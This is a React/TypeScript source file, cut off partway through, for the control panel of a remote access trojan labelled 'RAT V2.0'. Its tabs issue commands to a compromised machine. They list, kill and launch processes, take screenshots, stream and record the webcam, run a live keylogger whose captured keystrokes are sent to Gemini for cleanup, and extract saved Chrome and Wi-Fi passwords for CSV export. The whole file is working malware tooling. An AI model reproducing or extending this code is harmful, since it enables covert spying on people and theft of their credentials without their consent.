import React, { useState, useEffect, useRef } from "react";
// Import type từ hook để tránh lỗi typescript
import { useRemoteControl } from "./useRemoteControl";
import type { MediaItem, Process, ConnectionStatus } from "./useRemoteControl";

import {
  Monitor,
  Power,
  Camera,
  Video,
  Search,
  Ghost,
  Terminal,
  XCircle,
  Play,
  Wifi,
  RefreshCw,
  Save,
  Maximize2,
  History,
  Globe,
  Download,
  Sparkles,
  StopCircle,
  FileVideo,
  Image as ImageIcon,
  Key, // Thêm icon chìa khóa
  Copy, // Thêm icon copy
  Check, // Thêm icon check
} from "lucide-react";

// ==========================================
// 1. UI COMPONENTS
// ==========================================

const Card = ({ children, className = "" }: any) => (
  <div
    className={`bg-white/90 backdrop-blur-sm rounded-2xl shadow-lg border border-slate-200 overflow-hidden flex flex-col ${className}`}
  >
    {children}
  </div>
);

const Button = ({
  onClick,
  variant = "primary",
  icon: Icon,
  children,
  className = "",
  disabled = false,
}: any) => {
  const variants: any = {
    primary:
      "bg-gradient-to-r from-blue-600 to-blue-500 text-white hover:shadow-blue-500/30",
    danger:
      "bg-gradient-to-r from-red-600 to-red-500 text-white hover:shadow-red-500/30",
    warning:
      "bg-gradient-to-r from-amber-500 to-orange-500 text-white hover:shadow-orange-500/30",
    outline:
      "bg-white border border-slate-200 text-slate-700 hover:border-blue-500 hover:text-blue-600",
    ghost:
      "text-slate-500 hover:bg-slate-100 hover:text-slate-900 bg-transparent border-none",
  };
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      className={`px-5 py-2.5 rounded-xl font-bold transition-all duration-300 flex items-center justify-center gap-2 text-sm shadow-sm hover:-translate-y-0.5 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:translate-y-0 ${variants[variant]} ${className}`}
    >
      {Icon && <Icon size={18} strokeWidth={2.5} />} {children}
    </button>
  );
};

// --- MODAL HIỂN THỊ (Đã fix để chạy được cả Video và Ảnh) ---
const MediaModal = ({
  item,
  onClose,
}: {
  item: MediaItem | null;
  onClose: () => void;
}) => {
  if (!item) return null;
  const isVideo = item.type === "video";
  const ext = isVideo ? "webm" : "png";
  const fileName = `capture_${item.timestamp.replace(/:/g, "-")}.${ext}`;

  const handleSave = () => {
    const link = document.createElement("a");
    link.href = item.src;
    link.download = fileName;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div
      className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200"
      onClick={onClose}
    >
      <div
        className="relative max-w-7xl w-full flex flex-col items-center"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="w-full bg-slate-800 p-3 rounded-t-xl flex justify-between items-center border-b border-slate-700">
          <span className="text-white text-sm font-mono flex items-center gap-2">
            {isVideo ? <FileVideo size={14} /> : <ImageIcon size={14} />}{" "}
            {fileName}
          </span>
          <div className="flex gap-2">
            <button
              onClick={handleSave}
              className="px-4 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold rounded-lg flex items-center gap-2 transition-all"
            >
              <Download size={14} /> Save
            </button>
            <button
              onClick={onClose}
              className="text-slate-400 hover:text-red-500"
            >
              <XCircle size={20} />
            </button>
          </div>
        </div>
        <div className="bg-black/50 w-full flex justify-center p-2 rounded-b-xl border-x border-b border-slate-700/50">
          {isVideo ? (
            <video
              src={item.src}
              controls
              autoPlay
              className="max-w-full max-h-[80vh] rounded shadow-2xl"
            />
          ) : (
            <img
              src={item.src}
              className="max-w-full max-h-[80vh] rounded shadow-2xl"
            />
          )}
        </div>
      </div>
    </div>
  );
};

// ==========================================
// 2. TAB VIEWS
// ==========================================

// --- TAB SYSTEM (Giữ nguyên) ---
const TabSystem = ({ ctrl }: { ctrl: ReturnType<typeof useRemoteControl> }) => {
  const { data, actions } = ctrl;
  const [mode, setMode] = useState<"proc" | "app">("proc");
  const [search, setSearch] = useState("");
  const [manualCmd, setManualCmd] = useState("");

  const rawList = mode === "proc" ? data.processes : data.installedApps;
  const grouped = rawList.reduce((acc, item) => {
    const name = item.name || "Unknown";
    if (search && !name.toLowerCase().includes(search.toLowerCase()))
      return acc;
    const isApp = item.path ? true : false;
    const key = isApp ? item.path || name : name;
    if (!acc[key]) acc[key] = { ...item, count: 0, isApp };
    acc[key].count++;
    return acc;
  }, {} as Record<string, Process & { count: number; isApp: boolean }>);

  const sortedList = Object.values(grouped).sort((a, b) =>
    a.name.localeCompare(b.name)
  );

  return (
    <div className="h-full flex flex-col gap-4">
      <Card className="p-4 flex-none">
        <div className="flex flex-col md:flex-row gap-4 items-center">
          <div className="flex items-center gap-2 text-slate-700 font-bold min-w-[120px]">
            <Globe className="text-blue-500" size={20} />
            <span>Manual Run</span>
          </div>
          <div className="flex-1 w-full flex gap-2">
            <input
              type="text"
              value={manualCmd}
              onChange={(e) => setManualCmd(e.target.value)}
              onKeyDown={(e) =>
                e.key === "Enter" &&
                manualCmd &&
                actions.sendCommand("start_app", manualCmd)
              }
              placeholder="Ex: https://google.com, notepad, cmd.exe..."
              className="w-full px-4 py-2 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none text-sm font-mono text-slate-700"
            />
            <Button
              onClick={() => {
                if (manualCmd) actions.sendCommand("start_app", manualCmd);
              }}
              icon={Play}
            >
              Run
            </Button>
          </div>
        </div>
      </Card>

      <div className="flex flex-wrap gap-4 justify-between items-center bg-slate-50 p-3 rounded-xl border border-slate-200 flex-none">
        <div className="flex gap-2 bg-slate-200/50 p-1 rounded-lg">
          <button
            onClick={() => {
              setMode("proc");
              actions.sendCommand("list_process");
            }}
            className={`px-4 py-1.5 rounded-md text-sm font-bold transition-all ${
              mode === "proc"
                ? "bg-white text-blue-600 shadow-sm"
                : "text-slate-500 hover:text-slate-700"
            }`}
          >
            Processes
          </button>
          <button
            onClick={() => {
              setMode("app");
              actions.sendCommand("list_installed_apps");
            }}
            className={`px-4 py-1.5 rounded-md text-sm font-bold transition-all ${
              mode === "app"
                ? "bg-white text-blue-600 shadow-sm"
                : "text-slate-500 hover:text-slate-700"
            }`}
          >
            Applications
          </button>
        </div>
        <div className="relative w-full md:w-64">
          <Search
            className="absolute left-3 top-2.5 text-slate-400"
            size={16}
          />
          <input
            type="text"
            placeholder="Filter..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="w-full pl-9 pr-4 py-2 text-sm bg-white border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none"
          />
        </div>
      </div>

      <div className="flex-1 overflow-auto bg-white rounded-xl border border-slate-200 shadow-inner">
        <table className="w-full text-sm text-left">
          <thead className="bg-slate-50 text-slate-500 sticky top-0 z-10 font-semibold uppercase text-xs tracking-wider">
            <tr>
              <th className="px-6 py-3">Count/Type</th>
              <th className="px-6 py-3">Name / Path</th>
              <th className="px-6 py-3 text-right">Action</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-slate-100">
            {sortedList.map((item, i) => (
              <tr key={i} className="hover:bg-slate-50 group transition-colors">
                <td className="px-6 py-3">
                  {item.isApp ? (
                    <span className="text-blue-500 font-bold text-xs">APP</span>
                  ) : (
                    <span className="bg-slate-200 text-slate-600 px-2 py-1 rounded text-xs font-mono font-bold">
                      {item.count}
                    </span>
                  )}
                </td>
                <td className="px-6 py-3">
                  <div className="font-medium text-slate-700 group-hover:text-blue-600">
                    {item.name}
                  </div>
                  {item.path && (
                    <div className="text-xs text-slate-400 truncate max-w-md">
                      {item.path}
                    </div>
                  )}
                </td>
                <td className="px-6 py-3 text-right opacity-0 group-hover:opacity-100 transition-opacity">
                  {item.isApp ? (
                    <button
                      onClick={() =>
                        actions.sendCommand("start_app", item.path!)
                      }
                      className="px-3 py-1.5 bg-emerald-100 text-emerald-700 rounded-lg hover:bg-emerald-200 text-xs font-bold flex items-center gap-1 ml-auto"
                    >
                      <Play size={14} /> Start
                    </button>
                  ) : (
                    <button
                      onClick={() =>
                        actions.sendCommand("kill_process", item.name)
                      }
                      className="px-3 py-1.5 bg-red-100 text-red-700 rounded-lg hover:bg-red-200 text-xs font-bold flex items-center gap-1 ml-auto"
                    >
                      <XCircle size={14} /> Kill All
                    </button>
                  )}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
};

// --- TAB SURVEILLANCE (CHỈNH SỬA CHÍNH) ---
const TabSurveillance = ({
  ctrl,
}: {
  ctrl: ReturnType<typeof useRemoteControl>;
}) => {
  const { data, actions } = ctrl;
  const [zoomItem, setZoomItem] = useState<MediaItem | null>(null);
  const [isStreaming, setIsStreaming] = useState(false);
  const [activeSubTab, setActiveSubTab] = useState<"screenshot" | "webcam">(
    "screenshot"
  );

  // Refs cho việc quay video từ Canvas
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);

  // Tách History thành 2 mảng
  const screenshots = data.history.filter((item) => item.type === "image");
  const recordings = data.history.filter((item) => item.type === "video");

  // Vẽ Canvas liên tục
  useEffect(() => {
    if (data.liveStreamSrc && canvasRef.current) {
      const canvas = canvasRef.current;
      const ctx = canvas.getContext("2d");
      const img = new Image();
      img.onload = () => {
        canvas.width = img.width;
        canvas.height = img.height;
        ctx?.drawImage(img, 0, 0);
      };
      img.src = data.liveStreamSrc;
    }
  }, [data.liveStreamSrc]);

  const startRecording = () => {
    if (!canvasRef.current) return;
    // Capture stream 30fps
    const stream = canvasRef.current.captureStream(30);
    const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });

    chunksRef.current = [];
    recorder.ondataavailable = (e) => {
      if (e.data.size > 0) chunksRef.current.push(e.data);
    };

    recorder.onstop = () => {
      const blob = new Blob(chunksRef.current, { type: "video/webm" });
      const url = URL.createObjectURL(blob);
      const newItem: MediaItem = {
        type: "video",
        src: url,
        timestamp: new Date().toLocaleTimeString(),
      };
      // Lưu vào list history
      actions.addLocalHistory(newItem);
    };

    recorder.start();
    mediaRecorderRef.current = recorder;
  };

  const stopRecording = () => {
    if (
      mediaRecorderRef.current &&
      mediaRecorderRef.current.state !== "inactive"
    ) {
      mediaRecorderRef.current.stop();
    }
  };

  const toggleStream = () => {
    if (isStreaming) {
      actions.stopWebcam();
      stopRecording();
      setIsStreaming(false);
    } else {
      actions.startWebcam();
      setTimeout(() => startRecording(), 500); // Đợi ảnh về rồi quay
      setIsStreaming(true);
    }
  };

  return (
    <div className="h-full flex flex-col gap-4 overflow-hidden">
      <MediaModal item={zoomItem} onClose={() => setZoomItem(null)} />
      <canvas ref={canvasRef} className="hidden" />

      {/* Sub-Tab Navigation */}
      <div className="flex gap-4 border-b border-slate-200 pb-2 flex-none">
        <button
          onClick={() => setActiveSubTab("screenshot")}
          className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-bold transition-all ${
            activeSubTab === "screenshot"
              ? "bg-blue-100 text-blue-600"
              : "text-slate-500 hover:bg-slate-100"
          }`}
        >
          <Monitor size={18} /> Screenshot
        </button>
        <button
          onClick={() => setActiveSubTab("webcam")}
          className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-bold transition-all ${
            activeSubTab === "webcam"
              ? "bg-purple-100 text-purple-600"
              : "text-slate-500 hover:bg-slate-100"
          }`}
        >
          <Camera size={18} /> Webcam
        </button>
      </div>

      {/* Content Area - Flex Column to fill height */}
      <div className="flex-1 min-h-0 flex flex-col gap-4">
        {activeSubTab === "screenshot" && (
          <>
            {/* Controls */}
            <div className="flex-none">
              <Card className="p-4 border-l-4 border-l-blue-500 flex flex-row items-center justify-between">
                <h3 className="text-slate-700 font-bold flex items-center gap-2">
                  <Monitor size={20} className="text-blue-500" /> Capture Screen
                </h3>
                <Button onClick={() => actions.sendCommand("screenshot")}>
                  Capture Single Frame
                </Button>
              </Card>
            </div>

            {/* Media View - Flex Grow & Contain */}
            <div className="flex-1 min-h-0 bg-slate-900 rounded-2xl overflow-hidden shadow-inner border border-slate-700 flex items-center justify-center relative">
              {data.latestMedia && data.latestMedia.type === "image" ? (
                <img
                  src={data.latestMedia.src}
                  className="max-w-full max-h-full object-contain cursor-zoom-in"
                  onClick={() => setZoomItem(data.latestMedia)}
                />
              ) : (
                <div className="text-slate-600 flex flex-col items-center">
                  <Ghost size={48} className="mb-2 opacity-20" />
                  <span className="text-sm font-medium opacity-50">
                    No screenshot available
                  </span>
                </div>
              )}
            </div>

            {/* History - Fixed Height at Bottom */}
            <div className="flex-none h-40 flex flex-col gap-2">
              <h4 className="text-sm font-bold text-slate-500 uppercase flex items-center gap-2">
                <History size={16} /> Screenshot Gallery ({screenshots.length})
              </h4>
              <div className="flex-1 overflow-y-auto bg-slate-50 rounded-xl border border-slate-200 p-2">
                <div className="grid grid-cols-4 md:grid-cols-6 lg:grid-cols-8 gap-2">
                  {screenshots.map((item, idx) => (
                    <div
                      key={idx}
                      onClick={() => setZoomItem(item)}
                      className="aspect-video bg-slate-200 rounded-lg overflow-hidden cursor-pointer border border-slate-300 hover:ring-2 ring-blue-500 relative group shadow-sm hover:shadow-md transition-all"
                    >
                      <img
                        src={item.src}
                        className="w-full h-full object-cover"
                      />
                    </div>
                  ))}
                  {screenshots.length === 0 && (
                    <div className="col-span-full text-center text-sm text-slate-400 py-8">
                      No screenshots in history
                    </div>
                  )}
                </div>
              </div>
            </div>
          </>
        )}

        {activeSubTab === "webcam" && (
          <>
            {/* Controls */}
            <div className="flex-none">
              <Card className="p-4 border-l-4 border-l-purple-500 flex flex-row items-center justify-between">
                <h3 className="text-slate-700 font-bold flex items-center gap-2">
                  <Camera size={20} className="text-purple-500" /> Live Webcam
                </h3>
                <Button
                  variant={isStreaming ? "danger" : "warning"}
                  onClick={toggleStream}
                  icon={isStreaming ? StopCircle : Video}
                >
                  {isStreaming ? "Stop & Save Video" : "Start Live Stream"}
                </Button>
              </Card>
            </div>

            {/* Media View - Flex Grow & Contain */}
            <div className="flex-1 min-h-0 bg-slate-900 rounded-2xl overflow-hidden shadow-inner border border-slate-700 flex items-center justify-center relative">
              {data.liveStreamSrc ? (
                <div className="relative w-full h-full flex items-center justify-center">
                  <img
                    src={data.liveStreamSrc}
                    className="max-w-full max-h-full object-contain"
                  />
                  <div className="absolute top-4 right-4 flex items-center gap-2 px-3 py-1 bg-red-600 text-white text-xs font-bold rounded-full animate-pulse shadow-lg">
                    <div className="w-2 h-2 bg-white rounded-full"></div> REC
                  </div>
                </div>
              ) : (
                <div className="text-slate-600 flex flex-col items-center">
                  <Ghost size={48} className="mb-2 opacity-20" />
                  <span className="text-sm font-medium opacity-50">
                    Webcam is off
                  </span>
                </div>
              )}
            </div>

            {/* History - Fixed Height at Bottom */}
            <div className="flex-none h-40 flex flex-col gap-2">
              <h4 className="text-sm font-bold text-slate-500 uppercase flex items-center gap-2">
                <History size={16} /> Recording Gallery ({recordings.length})
              </h4>
              <div className="flex-1 overflow-y-auto bg-slate-50 rounded-xl border border-slate-200 p-2">
                <div className="grid grid-cols-4 md:grid-cols-6 lg:grid-cols-8 gap-2">
                  {recordings.map((item, idx) => (
                    <div
                      key={idx}
                      onClick={() => setZoomItem(item)}
                      className="aspect-video bg-black rounded-lg overflow-hidden cursor-pointer border border-slate-800 hover:ring-2 ring-purple-500 relative group shadow-sm hover:shadow-md transition-all"
                    >
                      <video
                        src={item.src}
                        className="w-full h-full object-cover opacity-80"
                      />
                      <div className="absolute inset-0 flex items-center justify-center">
                        <Play
                          className="text-white opacity-80"
                          size={24}
                          fill="white"
                        />
                      </div>
                      <div className="absolute bottom-1 right-1 bg-black/70 text-[10px] text-white px-1 rounded">
                        {item.timestamp}
                      </div>
                    </div>
                  ))}
                  {recordings.length === 0 && (
                    <div className="col-span-full text-center text-sm text-slate-400 py-8">
                      No recordings in history
                    </div>
                  )}
                </div>
              </div>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

// --- TAB KEYLOGGER (Giữ nguyên) ---
const TabKeylogger = ({
  ctrl,
}: {
  ctrl: ReturnType<typeof useRemoteControl>;
}) => {
  const { data, actions } = ctrl;
  const textAreaRef = useRef<HTMLTextAreaElement>(null);
  const [apiKey, setApiKey] = useState("");
  const [isAiLoading, setIsAiLoading] = useState(false);

  useEffect(() => {
    if (textAreaRef.current)
      textAreaRef.current.scrollTop = textAreaRef.current.scrollHeight;
  }, [data.keylogs]);

  const removeBackspace = (raw: string) => {
    const stack: string[] = [];
    let i = 0;
    while (i < raw.length) {
      if (raw.substring(i, i + 4) === "[BS]") {
        stack.pop();
        i += 4;
      } else {
        stack.push(raw[i]);
        i++;
      }
    }
    return stack.join("");
  };

  const askGemini = async () => {
    if (!apiKey) return alert("Please enter Gemini API Key!");
    setIsAiLoading(true);
    const rawText = removeBackspace(data.keylogs);
    const prompt = `Dịch đoạn log bàn phím sau sang Tiếng Việt có nghĩa. Tự sửa lỗi gõ sai, VNI/Telex. Chỉ trả về kết quả.\nInput: "${rawText}"`;

    try {
      const response = await fetch(
        `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] }),
        }
      );
      const json = await response.json();
      if (json.candidates && json.candidates[0].content) {
        alert("AI Result:\n" + json.candidates[0].content.parts[0].text);
      } else {
        alert("AI Error: " + JSON.stringify(json));
      }
    } catch (e) {
      alert("Network Error");
    } finally {
      setIsAiLoading(false);
    }
  };

  const downloadTxt = () => {
    const element = document.createElement("a");
    const file = new Blob([data.keylogs], { type: "text/plain" });
    element.href = URL.createObjectURL(file);
    element.download = `keylog_${new Date().toLocaleTimeString()}.txt`;
    document.body.appendChild(element);
    element.click();
  };

  return (
    <div className="h-full flex flex-col gap-4">
      <div className="bg-white p-4 rounded-xl border border-slate-200 shadow-sm flex flex-col gap-4 flex-none">
        <div className="flex justify-between items-center">
          <div className="flex items-center gap-4">
            <div
              className={`w-3 h-3 rounded-full ${
                data.isLogging ? "bg-green-500 animate-pulse" : "bg-slate-300"
              }`}
            ></div>
            <div>
              <h3 className="font-bold text-slate-700">Live Keylogger</h3>
              <p className="text-xs text-slate-400 font-mono">
                {data.isLogging ? "Monitoring active..." : "Monitoring paused"}
              </p>
            </div>
          </div>
          <div className="flex gap-2">
            {!data.isLogging ? (
              <Button onClick={() => actions.toggleLogging(true)} icon={Play}>
                Start Logging
              </Button>
            ) : (
              <Button
                variant="danger"
                onClick={() => actions.toggleLogging(false)}
                icon={Power}
              >
                Stop Logging
              </Button>
            )}
            <Button variant="outline" onClick={downloadTxt} icon={Save}>
              Save TXT
            </Button>
            <Button
              variant="ghost"
              onClick={actions.clearLogs}
              icon={XCircle}
            ></Button>
          </div>
        </div>
        <div className="flex flex-wrap gap-2 items-center bg-slate-50 p-2 rounded-lg border border-slate-200">
          <button
            onClick={askGemini}
            disabled={isAiLoading}
            className="px-3 py-1 text-xs font-bold bg-purple-600 text-white rounded flex gap-1 items-center hover:bg-purple-700 transition-colors"
          >
            <Sparkles size={12} />{" "}
            {isAiLoading ? "Processing..." : "AI Translate (Gemini)"}
          </button>
          <input
            type="password"
            value={apiKey}
            onChange={(e) => setApiKey(e.target.value)}
            placeholder="Paste your Gemini API Key here..."
            className="flex-1 bg-white border border-slate-300 text-xs rounded px-2 py-1 outline-none focus:border-purple-500"
          />
        </div>
      </div>
      <Card className="flex-1 relative bg-slate-900 border-slate-700 min-h-0">
        <textarea
          ref={textAreaRef}
          value={data.keylogs}
          readOnly
          className="w-full h-full bg-transparent text-green-400 font-mono p-4 pt-10 text-sm outline-none resize-none scrollbar-thin scrollbar-thumb-slate-700 scrollbar-track-transparent"
          placeholder="> Logs will appear here..."
        />
      </Card>
    </div>
  );
};
// --- TAB PASSWORDS (FINAL: TÁCH BIỆT WIFI/CHROME + SAVE FILE) ---
const TabPasswords = ({ ctrl }: { ctrl: ReturnType<typeof useRemoteControl> }) => {
  const { data, actions } = ctrl;
  const [viewMode, setViewMode] = useState<"wifi" | "browser">("browser");
  const [displayType, setDisplayType] = useState<"raw" | "table">("table");
  const [searchTerm, setSearchTerm] = useState("");
  const [parsedData, setParsedData] = useState<any[]>([]);
  const [rawDataString, setRawDataString] = useState<string>("");

  // --- 1. XỬ LÝ DỮ LIỆU CHROME (Khi chromeData thay đổi) ---
  useEffect(() => {
    if (!data.chromeData) return;

    const raw = data.chromeData;
    const parts = raw.split("|ENDOFLINE|");
    let allCreds: any[] = [];
    let fullRawContent = "";

    parts.forEach((part) => {
      if (!part.trim()) return;
      const firstLineBreak = part.indexOf("\n");
      if (firstLineBreak === -1) return;

      const header = part.substring(0, firstLineBreak).trim();
      const b64 = part.substring(firstLineBreak + 1).trim();

      if (b64) {
        try {
          const jsonStr = atob(b64);
          
          // Pretty Print cho chế độ xem RAW
          try {
             const jsonObj = JSON.parse(jsonStr);
             fullRawContent += `\n${header}\n${JSON.stringify(jsonObj, null, 2)}\n${"-".repeat(50)}\n`;
          } catch {
             fullRawContent += `\n${header}\n${jsonStr}\n${"-".repeat(50)}\n`;
          }

          // Parse vào bảng Table
          const creds = JSON.parse(jsonStr);
          let sourceName = "Unknown";
          const match = header.match(/output\\(.*?)\\passwords/);
          if (match && match[1]) sourceName = match[1];

          if (Array.isArray(creds)) {
            creds.forEach((c) => {
                // Chỉ lấy dòng có password (để bảng sạch đẹp)
                if (c.password && c.password.trim() !== "") {
                    allCreds.push({
                      source: sourceName,
                      origin: c.origin || c.url || "N/A",
                      username: c.username || "<No User>",
                      password: c.password, 
                    });
                }
            });
          }
        } catch (e) {
          fullRawContent += `\n${header}\n[Error decoding]\n`;
        }
      }
    });

    setParsedData(allCreds);
    setRawDataString(fullRawContent);
  }, [data.chromeData]); // Chỉ chạy khi data Chrome thay đổi

  // --- 2. CHỨC NĂNG LƯU FILE ---
  
  // Lưu Wifi ra file .txt
  const saveWifiTxt = () => {
      if (!data.wifiData) return alert("No Wifi data to save!");
      const blob = new Blob([data.wifiData], { type: "text/plain;charset=utf-8" });
      const url = URL.createObjectURL(blob);
      const link = document.createElement("a");
      link.href = url;
      link.download = `wifi_passwords_${new Date().getTime()}.txt`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
  };

  // Lưu Chrome ra file .csv (Excel)
  const saveBrowserCSV = () => {
    if (parsedData.length === 0) return alert("No Browser data to save!");
    const headers = ["Profile", "URL", "Username", "Password"];
    const csvContent = [
      headers.join(","),
      ...parsedData.map((item) =>
        `"${item.source}","${item.origin}","${item.username}","${item.password}"`
      ),
    ].join("\n");

    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = `chrome_passwords_${new Date().getTime()}.csv`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // --- 3. GIAO DIỆN ---
  
  // Hàm render bảng Browser
  const renderBrowserContent = () => {
      if (displayType === 'raw') {
          return (
            <div className="p-4 h-full overflow-auto bg-slate-900 text-green-400 font-mono text-xs whitespace-pre-wrap leading-relaxed">
                {rawDataString || "No data loaded. Click 'Extract'..."}
            </div>
          );
      }
      const filtered = parsedData.filter(item => 
        JSON.stringify(item).toLowerCase().includes(searchTerm.toLowerCase())
      );
      return (
        <table className="w-full text-sm text-left">
          <thead className="bg-slate-50 text-slate-500 sticky top-0 z-10 font-bold uppercase text-xs">
            <tr>
              <th className="px-4 py-3">Profile</th>
              <th className="px-4 py-3">Origin</th>
              <th className="px-4 py-3">User</th>
              <th className="px-4 py-3">Pass</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-slate-100">
            {filtered.map((item, idx) => (
              <tr key={idx} className="hover:bg-blue-50">
                <td className="px-4 py-2 font-mono text-xs text-slate-400">{item.source}</td>
                <td className="px-4 py-2 text-blue-600 truncate max-w-[200px]" title={item.origin}>{item.origin}</td>
                <td className="px-4 py-2 font-bold">{item.username}</td>
                <td className="px-4 py-2 text-red-600 font-mono bg-red-50 rounded select-all">{item.password}</td>
              </tr>
            ))}
          </tbody>
        </table>
      );
  };

  return (
    <div className="h-full flex flex-col gap-4">
      {/* HEADER */}
      <Card className="p-4 flex-none">
        <div className="flex flex-col md:flex-row justify-between items-center gap-4">
          
          {/* Nút chuyển Tab */}
          <div className="flex bg-slate-100 p-1 rounded-xl">
            <button onClick={() => setViewMode("browser")} className={`px-4 py-2 rounded-lg text-sm font-bold flex items-center gap-2 ${viewMode === "browser" ? "bg-white text-blue-600 shadow-sm" : "text-slate-500"}`}>
              <Globe size={18} /> Browser
            </button>
            <button onClick={() => setViewMode("wifi")} className={`px-4 py-2 rounded-lg text-sm font-bold flex items-center gap-2 ${viewMode === "wifi" ? "bg-white text-emerald-600 shadow-sm" : "text-slate-500"}`}>
              <Wifi size={18} /> Wifi
            </button>
          </div>

          {/* Controls cho Browser */}
          {viewMode === "browser" && (
            <div className="flex gap-2 items-center">
               <div className="flex bg-slate-100 rounded-lg p-1 mr-2">
                   <button onClick={() => setDisplayType('raw')} className={`px-3 py-1 rounded text-xs font-bold ${displayType === 'raw' ? 'bg-white shadow text-blue-600' : 'text-slate-400'}`}>Raw</button>
                   <button onClick={() => setDisplayType('table')} className={`px-3 py-1 rounded text-xs font-bold ${displayType === 'table' ? 'bg-white shadow text-blue-600' : 'text-slate-400'}`}>Table</button>
               </div>
              <div className="relative w-48">
                <input type="text" placeholder="Filter..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} className="w-full px-3 py-2 text-sm border rounded-lg outline-none focus:ring-2 focus:ring-blue-500" />
              </div>
              <Button onClick={() => actions.sendCommand("get_chrome")} icon={RefreshCw}>Extract</Button>
              
              {/* NÚT LƯU CSV (CHỈ HIỆN Ở TAB BROWSER) */}
              <Button variant="outline" onClick={saveBrowserCSV} disabled={parsedData.length === 0} icon={Save}>
                Save CSV
              </Button>
            </div>
          )}
          
          {/* Controls cho Wifi */}
          {viewMode === "wifi" && (
             <div className="flex gap-2">
                 <Button onClick={() => actions.sendCommand("get_password")} icon={RefreshCw}>Refresh Wifi</Button>
                 
                 {/* NÚT LƯU TXT (CHỈ HIỆN Ở TAB WIFI) */}
                 <Button variant="outline" onClick={saveWifiTxt} disabled={!data.wifiData} icon={Save}>
                    Save TXT
                 </Button>
             </div>
          )}
        </div>
      </Card>

      {/* BODY */}
      <div className="flex-1 overflow-hidden bg-white rounded-xl border border-slate-200 shadow-sm relative">
        {viewMode === "wifi" ? (
          <div className="absolute inset-0 p-6 overflow-auto bg-slate-900 text-emerald-400 font-mono text-sm whitespace-pre-wrap">
            {data.wifiData || "> Click 'Refresh Wifi' to scan saved networks..."}
          </div>
        ) : (
          <div className="absolute inset-0 overflow-auto">
              {renderBrowserContent()}
          </div>
        )}
      </div>
    </div>
  );
};
// ==========================================
// 3. LAYOUTS & APP
// ==========================================

const Dashboard = ({ ctrl }: { ctrl: ReturnType<typeof useRemoteControl> }) => {
  const [activeTab, setActiveTab] = useState<"sys" | "cam" | "key" | "pass">("sys");
  const [sidebarWidth, setSidebarWidth] = useState(256);
  const [isCollapsed, setIsCollapsed] = useState(false);
  const [isResizing, setIsResizing] = useState(false);
  
  const startResizing = (mouseDownEvent: React.MouseEvent) => {
    setIsResizing(true);
    const startX = mouseDownEvent.clientX;
    const startWidth = sidebarWidth;

    const doDrag = (mouseMoveEvent: MouseEvent) => {
      const newWidth = startWidth + mouseMoveEvent.clientX - startX;
      if (newWidth > 150 && newWidth < 400) {
        setSidebarWidth(newWidth);
      }
    };

    const stopDrag = () => {
      setIsResizing(false);
      document.removeEventListener("mousemove", doDrag);
      document.removeEventListener("mouseup", stopDrag);
    };

    document.addEventListener("mousemove", doDrag);
    document.addEventListener("mouseup", stopDrag);
  };

  return (
    <div className="flex h-screen bg-slate-100 font-sans text-slate-900 overflow-hidden">
      <aside
        style={{ width: isCollapsed ? 80 : sidebarWidth }}
        className={`bg-slate-900 text-white flex flex-col shadow-2xl z-20 relative ${
          isResizing
            ? "transition-none"
            : "transition-all duration-300 ease-in-out"
        }`}
      >
        {/* Resize Handle */}
        {!isCollapsed && (
          <div
            className="absolute right-0 top-0 bottom-0 w-1 cursor-col-resize hover:bg-blue-500 transition-colors z-50"
            onMouseDown={startResizing}
          />
        )}

        <div className="p-6 flex items-center justify-center">
          {/* Logo Area */}
          <div
            onClick={() => setIsCollapsed(!isCollapsed)}
            className="cursor-pointer hover:scale-105 transition-transform flex items-center gap-2"
          >
            <Ghost size={isCollapsed ? 32 : 24} className="text-blue-400" />
            {!isCollapsed && (
              <h1 className="text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent whitespace-nowrap">
                RAT V2.0
              </h1>
            )}
          </div>
        </div>

        {/* Connection Status */}
        {!isCollapsed && (
          <div className="px-6 mb-4 flex justify-between items-center animate-in fade-in duration-300">
            <div className="text-xs text-slate-400 flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>{" "}
              Connected
            </div>
            <button
              onClick={ctrl.actions.disconnect}
              className="text-[10px] bg-slate-800 hover:bg-red-600 px-2 py-1 rounded transition-colors text-slate-300 hover:text-white"
            >
              Disconnect
            </button>
          </div>
        )}

        <nav className="flex-1 px-4 space-y-2">
          {[
            { id: "sys", icon: Monitor, label: "System Control" },
            { id: "cam", icon: Video, label: "Surveillance" },
            { id: "key", icon: Terminal, label: "Keylogger" },
            { id: "pass", icon: Wifi, label: "Passwords" }, // <--- THÊM DÒNG NÀY
          ].map((item) => (
            <button
              key={item.id}
              onClick={() => setActiveTab(item.id as any)}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all duration-200 font-medium ${
                activeTab === item.id
